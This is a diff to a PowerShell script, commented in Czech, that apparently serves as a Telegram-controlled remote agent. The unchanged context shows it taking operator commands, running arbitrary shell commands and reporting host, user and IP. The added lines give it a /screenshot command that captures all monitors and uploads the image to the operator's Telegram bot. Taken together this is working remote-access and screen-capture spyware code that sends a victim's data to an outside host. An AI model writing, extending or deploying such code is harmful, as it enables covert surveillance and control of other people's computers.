@@ -86,6 +86,93 @@ function Send-Message($text) {
     }
 }
 
+function Send-Screenshot {
+    if(!$chatId){
+        Write-Log "ERROR: chatId neni nastaveno"
+        return
+    }
+    
+    Write-Log "Delam screenshot..."
+    
+    try {
+        # Načti System.Drawing a System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        Add-Type -AssemblyName System.Windows.Forms
+        
+        # Získej všechny obrazovky
+        $screens = [System.Windows.Forms.Screen]::AllScreens
+        
+        # Najdi celkový bounding box všech obrazovek
+        $left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
+        $top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
+        $right = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum
+        $bottom = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
+        
+        $width = $right - $left
+        $height = $bottom - $top
+        
+        # Vytvoř bitmap
+        $bounds = [System.Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
+        $bitmap = New-Object System.Drawing.Bitmap $width, $height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        
+        # Zachyť obrazovku
+        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+        
+        # Ulož do souboru
+        $screenshotPath = "C:\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+        
+        # Uvolni prostředky
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        
+        Write-Log "Screenshot ulozen: $screenshotPath"
+        
+        # Pošli do Telegramu
+        Write-Log "Odesilam screenshot do Telegramu..."
+        
+        $uri = "https://api.telegram.org/bot$botToken/sendPhoto"
+        
+        # Vytvoř multipart/form-data
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        
+        $bodyLines = @(
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"chat_id`"$LF",
+            $chatId,
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
+            "Content-Type: image/png$LF",
+            [System.IO.File]::ReadAllBytes($screenshotPath),
+            "--$boundary--$LF"
+        )
+        
+        # Sestav body jako byte array
+        $bodyBinary = @()
+        foreach ($line in $bodyLines) {
+            if ($line -is [byte[]]) {
+                $bodyBinary += $line
+            } else {
+                $bodyBinary += [System.Text.Encoding]::UTF8.GetBytes($line + $LF)
+            }
+        }
+        
+        # Pošli request
+        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBinary
+        
+        Write-Log "Screenshot odeslan OK"
+        
+        # Smaž dočasný soubor
+        Remove-Item $screenshotPath -Force
+        
+    } catch {
+        Write-Log "ERROR pri screenshotu: $_"
+        Send-Message "[ERROR] Nepodarilo se udelat screenshot: $($_.Exception.Message)"
+    }
+}
+
 Write-Log "Vstupuji do hlavni smycky"
 $loopCount = 0
 
@@ -135,7 +222,10 @@ while($true) {
                 }
                 Send-Message "[STATUS]`nPC: $pc`nUser: $user`nIP: $ip`nOnline"
             } elseif($cmd -eq '/help') {
-                Send-Message "Prikazy:`n/status - Info o PC`n/help - Napoveda`n/log - Zobraz log`n/kill - Ukonci agenta`n`nZadej CMD prikaz (ipconfig, dir, whoami, tasklist...)"
+                Send-Message "Prikazy:`n/status - Info o PC`n/help - Napoveda`n/screenshot - Screenshot obrazovky`n/log - Zobraz log`n/kill - Ukonci agenta`n`nZadej CMD prikaz (ipconfig, dir, whoami, tasklist...)"
+            } elseif($cmd -eq '/screenshot') {
+                Send-Message "Delam screenshot..."
+                Send-Screenshot
             } elseif($cmd -eq '/log') {
                 if(Test-Path $logFile) {
                     $logContent = Get-Content $logFile -Encoding UTF8 | Select-Object -Last 30 | Out-String
